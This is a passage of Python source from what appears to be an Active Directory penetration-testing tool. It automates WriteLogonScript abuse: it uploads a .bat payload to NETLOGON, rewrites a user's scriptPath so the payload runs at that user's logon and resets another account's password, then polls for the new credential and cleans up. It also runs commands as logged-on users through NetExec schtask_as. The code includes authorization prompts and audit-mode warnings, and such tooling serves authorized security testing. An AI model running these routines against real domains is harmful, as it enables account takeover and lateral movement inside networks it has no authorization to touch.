    attempted_candidates: list[dict[str, Any]] = []
    last_failure: dict[str, Any] | None = None
    for candidate in ordered_candidates:
        share_name = str(candidate.get("share") or "NETLOGON").strip() or "NETLOGON"
        directory_path = str(candidate.get("path") or "").strip()
        probe_result = probe_service.probe_file_upload(
            target_host=target_host,
            share_name=share_name,
            directory_path=directory_path,
            username=str(exec_username),
            password=password,
            auth_domain=str(domain),
            file_contents=b"@echo off\r\nrem adscan writelogonscript precheck\r\n",
            filename_prefix="adscan-logonscript-precheck-",
            filename_suffix=".bat",
            delete_after=True,
            use_kerberos=use_kerberos,
            kdc_host=target_host if use_kerberos else None,
        )
        attempted_candidates.append(
            {
                "name": str(candidate.get("name") or ""),
                "share": share_name,
                "path": directory_path,
                "validation": str(candidate.get("validation") or "").strip().lower() or "runtime",
                "success": probe_result.success,
                "status_code": probe_result.status_code or "",
                "error": probe_result.error_message or "",
            }
        )
        if probe_result.success:
            return (
                "precheck_succeeded",
                {
                    "user": exec_username,
                    "target_host": target_host,
                    "share": share_name,
                    "path": directory_path,
                    "selected_staging_candidate": str(candidate.get("name") or share_name),
                    "probe_path": probe_result.probed_file_path,
                    "auth_mode": probe_result.auth_mode,
                    "netlogon_write_confirmed": True,
                    "reason": "netlogon_write_probe_succeeded",
                    "attempted_candidates": attempted_candidates,
                },
            )
        last_failure = {
            "reason": "netlogon_write_probe_failed",
            "error": probe_result.error_message or "",
            "status_code": probe_result.status_code or "",
            "share": share_name,
            "path": directory_path,
            "probe_path": probe_result.probed_file_path,
            "auth_mode": probe_result.auth_mode,
        }

    return (
        "failed",
        {
            "user": exec_username,
            "target_host": target_host,
            "netlogon_write_confirmed": False,
            "attempted_candidates": attempted_candidates,
            **(last_failure or {"reason": "netlogon_write_probe_failed"}),
        },
    )


def _resolve_writelogonscript_next_step_strategy(
    *,
    summary: dict[str, Any],
    current_step_index: int,
    current_to_label: str,
) -> dict[str, Any] | None:
    """Return the supported chained-step strategy for one WriteLogonScript edge."""
    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
    if current_step_index < 0 or current_step_index >= len(steps) - 1:
        return None
    next_step = steps[current_step_index + 1]
    if not isinstance(next_step, dict):
        return None
    next_action = str(next_step.get("action") or "").strip().lower()
    next_details = (
        next_step.get("details") if isinstance(next_step.get("details"), dict) else {}
    )
    next_from = str(next_details.get("from") or "").strip()
    next_to = str(next_details.get("to") or "").strip()
    if next_action != "forcechangepassword":
        return None
    if current_to_label and next_from and current_to_label.upper() != next_from.upper():
        return None
    return {
        "strategy_key": "force_change_password",
        "next_step_index": current_step_index + 1,
        "next_action": str(next_step.get("action") or "").strip(),
        "target_user_label": next_to,
        "chained_step_index": current_step_index + 1,
        "chained_step_action": str(next_step.get("action") or "").strip(),
        "chained_step_from_label": next_from,
        "chained_step_to_label": next_to,
    }


def _extract_account_name_from_label(value: str) -> str:
    """Return the account portion from one ``NAME@DOMAIN`` label when possible."""
    label = str(value or "").strip()
    if not label:
        return ""
    return label.split("@", 1)[0].strip()


def _execute_writelogonscript_force_change_password_strategy(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    current_step_index: int,
    from_label: str,
    to_label: str,
    details: dict[str, Any],
    context_username: str | None,
    context_password: str | None,
    precheck_notes: dict[str, Any],
) -> tuple[str, dict[str, Any]]:
    """Stage a ForceChangePassword payload through one logon script."""
    from adscan_internal.services import ExploitationService
    from adscan_internal.services.smb_path_access_service import SMBPathAccessService

    strategy = _resolve_writelogonscript_next_step_strategy(
        summary=summary,
        current_step_index=current_step_index,
        current_to_label=to_label,
    )
    if not isinstance(strategy, dict):
        return ("unsupported_strategy", {"reason": "unsupported_next_step_strategy"})

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    password = context_password or _resolve_domain_password(shell, domain, exec_username)
    if not exec_username or not password:
        return (
            "blocked",
            {
                "reason": "missing_execution_password",
                "user": exec_username or "",
            },
        )

    target_host = str(precheck_notes.get("target_host") or details.get("host") or "").strip()
    if not target_host:
        return ("failed", {"reason": "missing_target_host"})

    target_object = str(details.get("target_dn") or "").strip() or _extract_account_name_from_label(to_label)
    next_target_label = str(strategy.get("target_user_label") or "").strip()
    next_target_user = _extract_account_name_from_label(next_target_label)
    if not target_object or not next_target_user:
        return (
            "failed",
            {
                "reason": "missing_target_selector",
                "target_object": target_object,
                "next_target_user": next_target_user,
            },
        )

    non_interactive = is_non_interactive(shell)
    generated_password = _generate_strong_password(16)
    selected_password = generated_password
    if not non_interactive:
        selected_password = (
            Prompt.ask(
                f"Password to set on {next_target_label}",
                default=generated_password,
            ).strip()
            or generated_password
        )
    if not _is_password_complex(selected_password):
        return (
            "blocked",
            {
                "reason": "invalid_followup_password",
                "next_target_user": next_target_user,
            },
        )

    payload = build_force_change_password_logon_script(
        target_username=next_target_user,
        new_password=selected_password,
        filename_suffix_token=secrets.token_hex(4),
    )

    domain_data = (
        getattr(shell, "domains_data", {}).get(domain, {})
        if isinstance(getattr(shell, "domains_data", {}), dict)
        else {}
    )
    use_kerberos = _prepare_kerberos_for_smb_execution(
        shell,
        operation_name="WriteLogonScript ForceChangePassword staging",
        domain=domain,
        username=str(exec_username),
        credential=password,
        domain_data=domain_data,
    )

    bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
    if not bloody_path:
        return (
            "failed",
            {
                "reason": "missing_bloodyad_path",
                "share": str(precheck_notes.get("share") or ""),
                "path": str(precheck_notes.get("path") or ""),
            },
        )

    service = ExploitationService()
    previous_script_path = ""
    previous_script_path_readable = False
    get_attrs_result = service.acl.get_object_attributes(
        pdc_host=target_host,
        bloody_path=bloody_path,
        domain=domain,
        username=exec_username,
        password=password,
        target_object=target_object,
        attribute_names=("scriptPath",),
        kerberos=use_kerberos,
        timeout=180,
    )
    if get_attrs_result.success:
        previous_script_path = str(get_attrs_result.attributes.get("scriptPath") or "").strip()
        previous_script_path_readable = True
    previous_script_path_original = previous_script_path
    stale_managed_script_path = ""
    stale_managed_script_deleted = False
    stale_managed_script_delete_error = ""
    if previous_script_path_readable and _is_adscan_managed_logon_script_path(previous_script_path):
        stale_managed_script_path = previous_script_path
        previous_script_path = ""
        print_warning(
            "WriteLogonScript found a stale ADscan-managed scriptPath on the target user. "
            "ADscan will replace it and will not restore the stale path afterwards."
        )
        print_info_debug(
            "[writelogonscript] stale managed scriptPath detected: "
            f"target={mark_sensitive(to_label, 'user')} "
            f"script_path={mark_sensitive(stale_managed_script_path, 'path')}"
        )
    if _is_audit_mode(shell):
        marked_target = mark_sensitive(to_label, "user")
        marked_executor = mark_sensitive(exec_username, "user")
        marked_next_target = mark_sensitive(next_target_label or next_target_user, "user")
        marked_share = mark_sensitive(str(precheck_notes.get("share") or "NETLOGON"), "text")
        marked_path = mark_sensitive(str(precheck_notes.get("path") or "\\"), "path")
        cleanup_notes: list[str] = []
        if stale_managed_script_path:
            cleanup_notes.append(
                f"The target currently points to an older ADscan artifact {mark_sensitive(stale_managed_script_path, 'path')}; ADscan will replace it and clear the stale restore baseline."
            )
        elif previous_script_path_readable and previous_script_path:
            cleanup_notes.append(
                f"The target already has scriptPath set to {mark_sensitive(previous_script_path, 'path')}; ADscan will overwrite it temporarily and then restore it."
            )
        elif previous_script_path_readable:
            cleanup_notes.append(
                "The target currently has no scriptPath set; ADscan will add one temporarily and then clear it."
            )
        else:
            cleanup_notes.append(
                "ADscan could not read the existing scriptPath value; cleanup will be best-effort only."
            )
        cleanup_notes.append(
            "If cleanup fails, the staged script or scriptPath change may remain until you remove them manually."
        )
        print_system_change_warning(
            title="[bold yellow]Disruptive Operation: WriteLogonScript[/bold yellow]",
            summary=(
                f"WriteLogonScript is disruptive in audit mode.\nExecution user: {marked_executor}\n"
                f"Logon-script target: {marked_target}\nFollow-up action: reset password for {marked_next_target}\n"
                f"Staging location: {marked_share} -> {marked_path}"
            ),
            planned_changes=[
                "Upload a .bat payload to the selected staging share.",
                "Overwrite scriptPath on the target user.",
                "Wait for the user to log on so the payload runs.",
                "Attempt to restore the original scriptPath and delete the staged file once the downstream credential is confirmed.",
            ],
            impact_notes=[
                "This changes a user logon script and depends on an interactive logon on the target account.",
            ],
            cleanup_notes=cleanup_notes,
            authorization_note=(
                "Only continue if you are explicitly authorized to stage a temporary logon script in this environment."
            ),
        )
        if non_interactive:
            print_info_debug(
                "[writelogonscript] non-interactive audit execution defaulted to 'No' for disruptive staging"
            )
            return ("blocked", {"reason": "operator_cancelled_disruptive_writelogonscript"})
        if not Confirm.ask("Proceed with WriteLogonScript staging?", default=False):
            return ("blocked", {"reason": "operator_cancelled_disruptive_writelogonscript"})

    upload_service = SMBPathAccessService()
    if stale_managed_script_path:
        stale_delete_result = upload_service.delete_file(
            target_host=target_host,
            share_name=str(precheck_notes.get("share") or "NETLOGON").strip() or "NETLOGON",
            file_path=_join_smb_path(str(precheck_notes.get("path") or "").strip(), stale_managed_script_path),
            username=str(exec_username),
            password=password,
            auth_domain=str(domain),
            use_kerberos=use_kerberos,
            kdc_host=target_host if use_kerberos else None,
        )
        stale_managed_script_deleted = bool(stale_delete_result.success)
        stale_managed_script_delete_error = str(stale_delete_result.error_message or "").strip()
        if stale_managed_script_deleted:
            print_info(
                "WriteLogonScript removed the stale ADscan-managed payload before staging the new one."
            )
        elif stale_managed_script_delete_error:
            print_info_debug(
                "[writelogonscript] stale managed payload delete failed; continuing with unique filename: "
                f"target={mark_sensitive(to_label, 'user')} "
                f"path={mark_sensitive(stale_managed_script_path, 'path')} "
                f"error={mark_sensitive(stale_managed_script_delete_error, 'text')}"
            )
    upload_result = upload_service.upload_file(
        target_host=target_host,
        share_name=str(precheck_notes.get("share") or "NETLOGON").strip() or "NETLOGON",
        directory_path=str(precheck_notes.get("path") or "").strip(),
        username=str(exec_username),
        password=password,
        auth_domain=str(domain),
        file_contents=payload.file_contents,
        remote_filename=payload.filename,
        delete_after=False,
        use_kerberos=use_kerberos,
        kdc_host=target_host if use_kerberos else None,
    )
    if not upload_result.success:
        return (
            "failed",
            {
                "reason": "payload_upload_failed",
                "user": exec_username,
                "share": upload_result.share_name,
                "path": upload_result.directory_path,
                "error": upload_result.error_message or "",
                "status_code": upload_result.status_code or "",
            },
        )
    set_result = service.acl.set_user_logon_script(
        pdc_host=target_host,
        bloody_path=bloody_path,
        domain=domain,
        username=exec_username,
        password=password,
        target_object=target_object,
        script_path=payload.script_path_value,
        kerberos=use_kerberos,
        timeout=180,
    )
    if not set_result.success:
        return (
            "failed",
            {
                "reason": "scriptpath_update_failed",
                "user": exec_username,
                "target_object": target_object,
                "share": upload_result.share_name,
                "path": upload_result.directory_path,
                "uploaded_file_path": upload_result.uploaded_file_path,
                "raw_output": set_result.raw_output or "",
                "error": set_result.error_message or "",
            },
        )

    return (
        "payload_staged",
        {
            "reason": "writelogonscript_forcechangepassword_staged",
            "payload_strategy": "force_change_password",
            "user": exec_username,
            "target_host": target_host,
            "share": upload_result.share_name,
            "path": upload_result.directory_path,
            "uploaded_file_path": upload_result.uploaded_file_path,
            "script_relative_path": payload.script_path_value,
            "script_filename": payload.filename,
            "scriptpath_target_object": target_object,
            "previous_script_path": previous_script_path,
            "previous_script_path_readable": previous_script_path_readable,
            "previous_script_path_original": previous_script_path_original,
            "stale_managed_script_path": stale_managed_script_path,
            "stale_managed_script_deleted": stale_managed_script_deleted,
            "stale_managed_script_delete_error": stale_managed_script_delete_error,
            "scriptpath_updated": True,
            "next_step_index": int(strategy.get("next_step_index") or -1),
            "next_step_action": str(strategy.get("next_action") or "ForceChangePassword"),
            "next_step_target_user": next_target_user,
            "chained_step_index": int(strategy.get("chained_step_index") or -1),
            "chained_step_action": str(
                strategy.get("chained_step_action") or strategy.get("next_action") or ""
            ),
            "chained_step_from_label": str(
                strategy.get("chained_step_from_label") or to_label or ""
            ),
            "chained_step_to_label": str(
                strategy.get("chained_step_to_label") or strategy.get("target_user_label") or ""
            ),
            "generated_password": selected_password,
            "target_login_required": True,
            "auth_mode": upload_result.auth_mode,
            "selected_staging_candidate": str(precheck_notes.get("selected_staging_candidate") or ""),
            "cleanup_pending": True,
        },
    )


def _mark_writelogonscript_cleanup_panel(
    *,
    target_user: str,
    uploaded_file_path: str,
    target_object: str,
    error_summary: str,
) -> None:
    """Render a strong operator-facing warning when cleanup could not complete."""
    lines = [
        "WriteLogonScript cleanup did not complete automatically.",
        "",
        f"Target user: {mark_sensitive(target_user or 'unknown', 'user')}",
        f"Uploaded script: {mark_sensitive(uploaded_file_path or 'unknown', 'path')}",
        f"Target object: {mark_sensitive(target_object or 'unknown', 'text')}",
        "",
        "Manual cleanup is required before closing this engagement.",
        f"Error: {mark_sensitive(error_summary or 'unknown', 'text')}",
    ]
    print_panel(
        "\n".join(lines),
        title="Manual Cleanup Required",
        border_style="red",
        expand=False,
    )


def _poll_writelogonscript_followup_credential(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    from_label: str,
    to_label: str,
    target_user: str,
    target_password: str,
) -> dict[str, Any]:
    """Poll for the downstream credential created by a staged logon script.

    The logon script only becomes effective once the target user logs on. This
    helper waits in short intervals, verifies the staged password silently, and
    preserves detailed timing/attempt metadata in the step notes so operators
    can understand whether the path is still pending or already confirmed.
    """
    initial_wait_seconds = _env_int(
        "ADSCAN_WRITELOGONSCRIPT_POLL_SECONDS",
        60,
        minimum=5,
    )
    extend_wait_seconds = _env_int(
        "ADSCAN_WRITELOGONSCRIPT_POLL_EXTEND_SECONDS",
        initial_wait_seconds,
        minimum=5,
    )
    interval_seconds = _env_int(
        "ADSCAN_WRITELOGONSCRIPT_POLL_INTERVAL_SECONDS",
        5,
        minimum=1,
    )
    max_extensions = _env_int(
        "ADSCAN_WRITELOGONSCRIPT_POLL_MAX_EXTENSIONS",
        10,
        minimum=0,
    )
    auto_extend = is_non_interactive(shell) or _env_flag_enabled(
        "ADSCAN_WRITELOGONSCRIPT_AUTO_EXTEND"
    )

    attempts = 0
    total_wait_seconds = 0
    current_wait_budget = initial_wait_seconds
    extensions_used = 0
    started_at = datetime.now(UTC)

    marked_target_user = mark_sensitive(target_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    marked_from = mark_sensitive(from_label, "user")
    marked_to = mark_sensitive(to_label, "user")
    step_count = len(summary.get("steps", [])) if isinstance(summary.get("steps"), list) else 0
    print_info(
        "WriteLogonScript validation started: polling LDAP for "
        f"{marked_target_user}@{marked_domain} for up to {initial_wait_seconds}s."
    )
    print_info_debug(
        "[writelogonscript] polling context initialized: "
        f"from={marked_from} to={marked_to} target={marked_target_user} "
        f"domain={marked_domain} summary_steps={step_count}"
    )

    while True:
        deadline = time.monotonic() + current_wait_budget
        print_info_debug(
            "[writelogonscript] follow-up credential polling window started: "
            f"domain={marked_domain} target={marked_target_user} "
            f"budget_seconds={current_wait_budget} interval_seconds={interval_seconds} "
            f"extensions_used={extensions_used}"
        )
        while True:
            attempts += 1
            print_info_debug(
                "[writelogonscript] polling attempt: "
                f"domain={marked_domain} target={marked_target_user} "
                f"attempt={attempts} waited_seconds={total_wait_seconds}"
            )
            verified = False
            try:
                verified = bool(
                    shell.verify_domain_credentials(
                        domain,
                        target_user,
                        target_password,
                        ui_silent=True,
                    )
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_info_debug(
                    "[writelogonscript] follow-up verification attempt failed: "
                    f"target={marked_target_user} error={exc}"
                )
            if verified:
                detected_at = datetime.now(UTC)
                elapsed_seconds = max(
                    0,
                    int((detected_at - started_at).total_seconds()),
                )
                print_info(
                    "WriteLogonScript validation succeeded: "
                    f"{marked_target_user}@{marked_domain} authenticated after {elapsed_seconds}s."
                )
                return {
                    "verification_status": "confirmed",
                    "verification_attempts": attempts,
                    "verification_wait_seconds": elapsed_seconds,
                    "verification_started_at": started_at.isoformat(),
                    "verification_completed_at": detected_at.isoformat(),
                    "verification_extensions_used": extensions_used,
                    "target_login_required": False,
                }

            remaining_seconds = deadline - time.monotonic()
            if remaining_seconds <= 0:
                break
            sleep_seconds = min(interval_seconds, max(1, int(remaining_seconds)))
            print_info_debug(
                "[writelogonscript] credential not active yet: "
                f"target={marked_target_user} sleeping_seconds={sleep_seconds} "
                f"remaining_seconds={max(0, int(remaining_seconds))}"
            )
            time.sleep(sleep_seconds)
            total_wait_seconds += sleep_seconds

        timeout_at = datetime.now(UTC)
        elapsed_seconds = max(0, int((timeout_at - started_at).total_seconds()))
        print_warning(
            "WriteLogonScript validation is still pending: "
            f"{marked_target_user}@{marked_domain} did not authenticate within {elapsed_seconds}s."
        )
        if extensions_used >= max_extensions:
            print_info_debug(
                "[writelogonscript] maximum polling extensions reached: "
                f"target={marked_target_user} max_extensions={max_extensions}"
            )
            return {
                "verification_status": "pending",
                "verification_attempts": attempts,
                "verification_wait_seconds": elapsed_seconds,
                "verification_started_at": started_at.isoformat(),
                "verification_completed_at": timeout_at.isoformat(),
                "verification_extensions_used": extensions_used,
                "target_login_required": True,
            }

        if auto_extend:
            extensions_used += 1
            current_wait_budget = extend_wait_seconds
            print_info(
                "WriteLogonScript validation extended automatically: "
                f"waiting another {extend_wait_seconds}s for {marked_target_user}@{marked_domain}."
            )
            continue

        if Confirm.ask(
            f"Keep polling {marked_target_user}@{marked_domain} for another {extend_wait_seconds}s?",
            default=True,
        ):
            extensions_used += 1
            current_wait_budget = extend_wait_seconds
            print_info(
                "WriteLogonScript validation extended by operator: "
                f"waiting another {extend_wait_seconds}s."
            )
            continue

        return {
            "verification_status": "pending",
            "verification_attempts": attempts,
            "verification_wait_seconds": elapsed_seconds,
            "verification_started_at": started_at.isoformat(),
            "verification_completed_at": timeout_at.isoformat(),
            "verification_extensions_used": extensions_used,
            "target_login_required": True,
        }


def _attempt_writelogonscript_cleanup_if_ready(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
) -> None:
    """Cleanup staged WriteLogonScript artifacts once the downstream credential exists."""
    from adscan_internal.services import ExploitationService
    from adscan_internal.services.smb_path_access_service import SMBPathAccessService

    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
    if not isinstance(steps, list):
        return

    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        status = str(step.get("status") or "").strip().lower()
        if action != "writelogonscript" or status not in {"attempted", "success"}:
            continue
        details = step.get("details") if isinstance(step.get("details"), dict) else {}
        if not bool(details.get("cleanup_pending")):
            continue
        if str(details.get("payload_strategy") or "").strip().lower() != "force_change_password":
            continue

        next_target_user = str(details.get("next_step_target_user") or "").strip()
        generated_password = str(details.get("generated_password") or "").strip()
        if not next_target_user or not generated_password:
            continue
        stored_target_credential = _get_stored_domain_credential_for_user(
            shell,
            domain=domain,
            username=next_target_user,
        )
        if stored_target_credential != generated_password:
            continue

        cleanup_user = str(details.get("user") or "").strip()
        cleanup_password = _resolve_domain_password(shell, domain, cleanup_user)
        target_host = str(details.get("target_host") or "").strip()
        share_name = str(details.get("share") or "").strip()
        uploaded_file_path = str(details.get("uploaded_file_path") or "").strip()
        target_object = str(details.get("scriptpath_target_object") or "").strip()
        previous_script_path = str(details.get("previous_script_path") or "").strip()
        previous_readable = bool(details.get("previous_script_path_readable"))
        cleanup_domain_data = (
            getattr(shell, "domains_data", {}).get(domain, {})
            if isinstance(getattr(shell, "domains_data", {}), dict)
            else {}
        )
        use_kerberos = _prepare_kerberos_for_smb_execution(
            shell,
            operation_name="WriteLogonScript cleanup",
            domain=domain,
            username=cleanup_user,
            credential=cleanup_password or "",
            domain_data=cleanup_domain_data if isinstance(cleanup_domain_data, dict) else {},
        )

        cleanup_notes = dict(details)
        cleanup_notes["cleanup_checked_at"] = datetime.now(UTC).isoformat()
        cleanup_notes["cleanup_trigger_user"] = next_target_user

        if not cleanup_user or not cleanup_password or not target_host or not share_name or not uploaded_file_path or not target_object:
            cleanup_notes.update(
                {
                    "cleanup_status": "failed",
                    "cleanup_pending": True,
                    "cleanup_error": "Missing cleanup credential or artifact metadata.",
                }
            )
            update_edge_status_by_labels(
                shell,
                domain,
                from_label=str(details.get("from") or ""),
                relation=str(step.get("action") or ""),
                to_label=str(details.get("to") or ""),
                status="success",
                notes=cleanup_notes,
            )
            step["status"] = "success"
            step["details"] = cleanup_notes
            _mark_writelogonscript_cleanup_panel(
                target_user=next_target_user,
                uploaded_file_path=uploaded_file_path,
                target_object=target_object,
                error_summary="Missing cleanup credential or artifact metadata.",
            )
            continue

        smb_service = SMBPathAccessService()
        delete_result = smb_service.delete_file(
            target_host=target_host,
            share_name=share_name,
            file_path=uploaded_file_path,
            username=cleanup_user,
            password=cleanup_password,
            auth_domain=domain,
            use_kerberos=use_kerberos,
            kdc_host=target_host if use_kerberos else None,
        )
        service = ExploitationService()
        bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
        revert_success = False
        revert_error = ""
        if bloody_path and previous_readable:
            revert_result = service.acl.set_user_logon_script(
                pdc_host=target_host,
                bloody_path=bloody_path,
                domain=domain,
                username=cleanup_user,
                password=cleanup_password,
                target_object=target_object,
                script_path=previous_script_path if previous_script_path else None,
                kerberos=use_kerberos,
                timeout=180,
            )
            revert_success = bool(revert_result.success)
            revert_error = str(revert_result.error_message or revert_result.raw_output or "").strip()
        else:
            revert_error = "Original scriptPath value was not captured; automatic revert skipped."

        cleanup_ok = bool(delete_result.success and revert_success)
        cleanup_notes.update(
            {
                "cleanup_pending": not cleanup_ok,
                "cleanup_status": "success" if cleanup_ok else "failed",
                "cleanup_completed_at": datetime.now(UTC).isoformat(),
                "cleanup_file_deleted": bool(delete_result.success),
                "cleanup_scriptpath_reverted": bool(revert_success),
                "cleanup_file_error": delete_result.error_message or "",
                "cleanup_scriptpath_error": revert_error,
            }
        )
        update_edge_status_by_labels(
            shell,
            domain,
            from_label=str(details.get("from") or ""),
            relation=str(step.get("action") or ""),
            to_label=str(details.get("to") or ""),
            status="success",
            notes=cleanup_notes,
        )
        step["status"] = "success"
        step["details"] = cleanup_notes
        if cleanup_ok:
            print_info(
                "WriteLogonScript cleanup completed: the staged script was removed and the original "
                f"scriptPath was restored for {mark_sensitive(str(details.get('to') or ''), 'user')}."
            )
            continue
        _mark_writelogonscript_cleanup_panel(
            target_user=next_target_user,
            uploaded_file_path=uploaded_file_path,
            target_object=target_object,
            error_summary=(
                delete_result.error_message
                or revert_error
                or "One or more automatic cleanup operations failed."
            ),
        )


def _extract_password_spray_step_metadata(
    details: dict[str, Any],
) -> tuple[str | None, str | None, str | None]:
    """Return spray metadata persisted in one PasswordSpray path step."""
    spray_type = str(details.get("spray_type") or "").strip() or None
    spray_category = str(details.get("spray_category") or "").strip() or None
    password_value = details.get("password")
    password = password_value if isinstance(password_value, str) else None
    return spray_type, spray_category, password


def _sanitize_filename_token(value: str, *, fallback: str) -> str:
    """Return a filesystem-safe token for log file names."""
    token = re.sub(r"[^a-zA-Z0-9_.-]+", "_", str(value or "").strip())
    token = token.strip("._")
    return token or fallback


def _is_valid_domain_username(value: str, *, allow_machine: bool = False) -> bool:
    """Validate a candidate domain username/sAMAccountName."""
    candidate = str(value or "").strip()
    if not candidate:
        return False
    if len(candidate) > 20:
        return False
    if allow_machine and candidate.endswith("$"):
        candidate = candidate[:-1]
    if not candidate:
        return False
    return bool(re.fullmatch(r"[A-Za-z0-9._-]+", candidate))


def _generate_default_hassession_username() -> str:
    """Generate a short default domain username for HasSession escalation."""
    stamp = datetime.now(UTC).strftime("%m%d%H%M")
    suffix = f"{secrets.randbelow(100):02d}"
    return f"adscan{stamp}{suffix}"[:20]


def _generate_strong_password(length: int = 12) -> str:
    """Backward-compatible wrapper around centralized password generation."""
    return generate_strong_password(length)


def _is_password_complex(value: str) -> bool:
    """Backward-compatible wrapper around centralized password validation."""
    return is_password_complex(value)


def _run_netexec_for_domain(
    shell: Any,
    *,
    domain: str,
    command: str,
    timeout: int = 300,
) -> Any:
    """Run a NetExec command with domain-aware retry/sync when available."""
    netexec_runner = getattr(shell, "_run_netexec", None)
    if callable(netexec_runner):
        return netexec_runner(command, domain=domain, timeout=timeout)
    return shell.run_command(command, timeout=timeout)


def _run_hassession_schtask_command(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    exec_password: str,
    target_host: str,
    session_user: str,
    command_to_run: str,
    log_suffix: str,
) -> tuple[bool, str]:
    """Execute NetExec `schtask_as` for HasSession abuse on a target host."""
    marked_host = mark_sensitive(target_host, "hostname")
    marked_exec_user = mark_sensitive(exec_username, "user")
    marked_session_user = mark_sensitive(session_user, "user")
    print_info_debug(
        "[hassession] Running schtask_as on "
        f"{marked_host} as session user {marked_session_user} "
        f"(executor: {marked_exec_user})."
    )
    auth = shell.build_auth_nxc(exec_username, exec_password, domain, kerberos=False)
    safe_host = _sanitize_filename_token(target_host, fallback="target")
    safe_exec_user = _sanitize_filename_token(exec_username, fallback="executor")
    safe_suffix = _sanitize_filename_token(log_suffix, fallback="command")
    log_path = (
        f"domains/{domain}/smb/"
        f"hassession_{safe_suffix}_{safe_exec_user}_{safe_host}.log"
    )
    module_command = (
        f"{shell.netexec_path} smb {shlex.quote(target_host)} {auth} "
        f"-t 1 --timeout 60 --smb-timeout 10 "
        f"-M schtask_as "
        f"-o CMD={shlex.quote(command_to_run)} USER={shlex.quote(session_user)} "
        f"--log {shlex.quote(log_path)}"
    )
    result = _run_netexec_for_domain(
        shell,
        domain=domain,
        command=module_command,
        timeout=300,
    )
    if result is None:
        return False, ""
    stdout = str(getattr(result, "stdout", "") or "")
    stderr = str(getattr(result, "stderr", "") or "")
    output = "\n".join(part for part in (stdout, stderr) if part)
    return bool(getattr(result, "returncode", 1) == 0), output


def _resolve_exec_password_for_user(
    shell: Any,
    *,
    domain: str,
    username: str,
    context_username: str | None,
    context_password: str | None,
) -> str | None:
    """Resolve the password/hash for ``username`` without mismatching context creds."""
    if not username:
        return None
    context_user = _normalize_account(context_username or "")
    if context_password and context_user and username.lower() == context_user.lower():
        return context_password
    return _resolve_domain_password(shell, domain, username)


def _resolve_hassession_host_and_user(
    shell: Any,
    *,
    domain: str,
    from_label: str,
    to_label: str,
) -> tuple[str | None, str | None]:
    """Resolve HasSession host and logged-on user from path labels."""
    from_target = resolve_netexec_target_for_node_label(
        shell, domain, node_label=from_label
    )
    to_target = resolve_netexec_target_for_node_label(shell, domain, node_label=to_label)
    from_user = _normalize_account(from_label)
    to_user = _normalize_account(to_label)

    if isinstance(from_target, str) and from_target.strip():
        host = from_target.strip()
        return host, to_user or from_user or None
    if isinstance(to_target, str) and to_target.strip():
        host = to_target.strip()
        return host, from_user or to_user or None
    return None, to_user or from_user or None


def _extract_group_name_from_label(value: str) -> str:
    """Extract group name from canonical labels like ``GROUP@DOMAIN``."""
    raw = str(value or "").strip()
    if not raw:
        return ""
    if "@" in raw:
        raw = raw.split("@", 1)[0].strip()
    return raw


def _resolve_users_from_principal_label(
    shell: Any,
    *,
    domain: str,
    principal_label: str,
) -> list[str]:
    """Resolve candidate users from a principal label (user or group)."""
    normalized_user = _normalize_account(principal_label)
    if _is_valid_domain_username(normalized_user):
        return [normalized_user]

    group_name = _extract_group_name_from_label(principal_label)
    if not group_name:
        return []
    members = resolve_group_user_members(
        shell,
        domain,
        group_name,
        enabled_only=True,
        max_results=500,
    )
    if members is None:
        return []
    valid_members = [
        user
        for user in members
        if _is_valid_domain_username(user) and not str(user).endswith("$")
    ]
    return sorted(set(valid_members), key=str.lower)


def _collect_previous_host_access_candidates(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
    context_username: str | None,
    context_password: str | None,
) -> list[tuple[str, str]]:
    """Collect candidate executor users from prior host-access relations.

    Returns:
        List of ``(username, reason)`` sorted by confidence/priority.
    """
    target_host_clean = str(target_host or "").strip().lower()
    if not target_host_clean:
        return []
    relation_priority = {
        "adminto": 0,
        "sqladmin": 1,
        "canpsremote": 2,
        "canrdp": 3,
    }
    best: dict[str, tuple[tuple[int, int, int], str]] = {}

    for index in range(current_step_index - 1, -1, -1):
        step = steps[index]
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if action not in relation_priority:
            continue
        details = step.get("details") if isinstance(step.get("details"), dict) else {}
        from_label = str(details.get("from") or "").strip()
        to_label = str(details.get("to") or "").strip()
        if not from_label or not to_label:
            continue
        resolved_target = resolve_netexec_target_for_node_label(
            shell, domain, node_label=to_label
        )
        if not isinstance(resolved_target, str) or not resolved_target.strip():
            continue
        if resolved_target.strip().lower() != target_host_clean:
            continue

        users = _resolve_users_from_principal_label(
            shell,
            domain=domain,
            principal_label=from_label,
        )
        if not users:
            continue
        step_status = str(step.get("status") or "discovered").strip().lower()
        status_rank = 0 if step_status == "success" else 1
        distance = current_step_index - index
        relation_rank = relation_priority[action]
        reason = f"{action}:{step_status}"
        for user in users:
            password = _resolve_exec_password_for_user(
                shell,
                domain=domain,
                username=user,
                context_username=context_username,
                context_password=context_password,
            )
            if not password:
                continue
            score = (status_rank, distance, relation_rank)
            existing = best.get(user)
            if existing is None or score < existing[0]:
                best[user] = (score, reason)

    ordered = sorted(best.items(), key=lambda item: (item[1][0], item[0]))
    return [(username, metadata[1]) for username, metadata in ordered]


def _select_candidate_executor_user(
    shell: Any,
    *,
    candidates: list[tuple[str, str]],
) -> str | None:
    """Prompt operator to select candidate executor user when multiple exist."""
    if not candidates:
        return None
    if len(candidates) == 1 or is_non_interactive(shell):
        return candidates[0][0]
    if not hasattr(shell, "_questionary_select"):
        return candidates[0][0]

    options = [
        f"{mark_sensitive(user, 'user')}  [{reason}]"
        for user, reason in candidates
    ]
    options.append("Cancel")
    selected = shell._questionary_select(
        "Select execution user for HasSession step:",
        options,
        default_idx=0,
    )
